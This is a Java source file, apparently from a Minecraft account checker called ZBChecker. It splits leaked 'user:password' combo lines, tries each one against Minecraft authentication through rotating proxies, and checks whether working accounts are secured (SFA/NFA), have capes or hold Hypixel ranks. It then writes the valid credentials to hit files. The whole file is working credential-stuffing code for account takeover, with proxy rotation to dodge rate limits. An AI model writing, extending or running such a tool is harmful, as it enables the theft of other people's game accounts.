package lau.ZBChecker.threads;

import lau.ZBChecker.Account;
import lau.ZBChecker.Main;
import lau.ZBChecker.Windows;
import lau.ZBChecker.check.hypixel.Hypixel;
import lau.ZBChecker.check.minecraft.Minecraft;
import lau.ZBChecker.check.optifine.Optifine;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.apache.http.HttpHost;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import static org.fusesource.jansi.Ansi.ansi;

public class CheckThread extends Thread {
    public Account account;
    protected transient Log log = LogFactory.getLog("Checker");

    public CheckThread(Account account) {
        this.account = account;
    }

    protected String[] getProxy(int index) throws ArrayIndexOutOfBoundsException {
        String[] splitProxy = Main.proxyList.get(index).split(":");
        if (splitProxy.length != 2) { // This means that this proxy is a bad line
            Main.proxyList.remove(index);
            throw new ArrayIndexOutOfBoundsException("Bad proxy line.");
        }
        return splitProxy;
    }

    public void saveResult(File file, String result) {
        if (!file.exists()) {
            try {
                file.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        try {
            final FileWriter fileWriter = new FileWriter(file, true);
            fileWriter.append(result + "\r\n");
            fileWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
            saveResult(file, result);
        }
    }

    @Override
    public void run() {
        String[] splitCombo;
        if (account.originalCombo.equals("")) return;
        else splitCombo = account.originalCombo.split(":", 2);
        if (splitCombo.length != 2) return;
        account.user = splitCombo[0];
        account.password = splitCombo[1];
        int currentProxyIndex;

        while (account.checkedTimes < Main.config.recheckTimes) {
            // Set proxy
            currentProxyIndex = Math.toIntExact(Main.totalTriedTimes++ % Main.proxyList.size());
            String[] splitProxy = getProxy(currentProxyIndex);
            final HttpHost proxy = new HttpHost(splitProxy[0], Integer.parseInt(splitProxy[1]), Main.config.proxyType);

            // Check Minecraft
            try {
                Minecraft.checkAccount(account, proxy);
            } catch (IOException e) { // This means that this is a bad proxy
                //Main.proxyList.remove(splitProxy[0] + ":" + splitProxy[1]);
                Windows.refreshTitle();
                continue;
            }
            if (account.isAccessible) break;
        }

        if (account.isPremium) {
            // Check SFA
            account.checkedTimes = 0;
            while (account.checkedTimes < Main.config.recheckTimes) {
                currentProxyIndex = Math.toIntExact(Main.totalTriedTimes++ % Main.proxyList.size());
                String[] splitProxy = Main.proxyList.get(currentProxyIndex).split(":");
                final HttpHost proxy = new HttpHost(splitProxy[0], Integer.parseInt(splitProxy[1]), Main.config.proxyType);
                try {
                    Minecraft.checkSecurity(account, proxy);
                    break;
                } catch (IOException e) { // This means that this is a bad proxy
                    //Main.proxyList.remove(splitProxy[0] + ":" + splitProxy[1]);
                    Windows.refreshTitle();
                }
            }

            if (Main.config.check_mojangCape) {
                // Check Mojang cape
                account.checkedTimes = 0;
                while (account.checkedTimes < Main.config.recheckTimes) {
                    try {
                        Minecraft.mojangCape(account);
                        break;
                    } catch (IOException ignored) { // Ignore network exceptions and loop to deal with some unexpected situations
                    }
                }
            }

            if (Main.config.check_optifine) {
                // Check Optifine cape
                account.checkedTimes = 0;
                while (account.checkedTimes < Main.config.recheckTimes) {
                    try {
                        Optifine.cape(account);
                        break;
                    } catch (IOException ignored) {
                    }
                }
            }

            if (Main.config.check_hypixelInfo) {
                // Check Hypixel
                account.checkedTimes = 0;
                while (account.checkedTimes < Main.config.recheckTimes) {
                    try {
                        account.hypixelRaw = Hypixel.getRaw(account);
                        Hypixel.rank(account);
                        Hypixel.level(account);
                        break;
                    } catch (IOException ignored) {
                    }
                }
            }

            // Save Result
            final String result = "[" + (account.isSFA ? "SFA" : "NFA") + "]"
                    + (account.isMojangCape ? "[MojangCape]" : "")
                    + (account.isOptifineCape ? "[OF]" : "")
                    + (account.isHypixelHighLevel ? "[HighLvl]" : "")
                    + (account.isHypixelMiddleLevel ? "[MidLvl]" : "")
                    + ((account.hypixelRank.equals("DEFAULT")) ? "" : account.hypixelRank);
            Main.counter.hits++;
            saveResult(new File(Main.fileFolderName + "/" + result + ".txt"),
                    result
                            + "[" + account.hypixelLevel + "]"
                            + " " + account.originalCombo
                            + " | " + account.playerName);
            log.warn(ansi().render("@|green " + result
                    + "[" + account.hypixelLevel + "]"
                    + " " + account.originalCombo
                    + " | " + account.playerName + "|@"));
        } else if (account.isAccessible) {
            Main.counter.demo++;
            saveResult(new File(Main.fileFolderName + "/demo.txt"),
                    "[DEMO]" + account.originalCombo);
            log.warn(ansi().render("@|blue [DEMO] " + account.originalCombo + "|@"));
        } else log.warn(ansi().render("@|red [BAD] " + account.originalCombo + "|@"));
        Main.counter.checked++;
        Main.totalThreads--;
        //Main.comboList.notify();
        Windows.refreshTitle();
    }
}
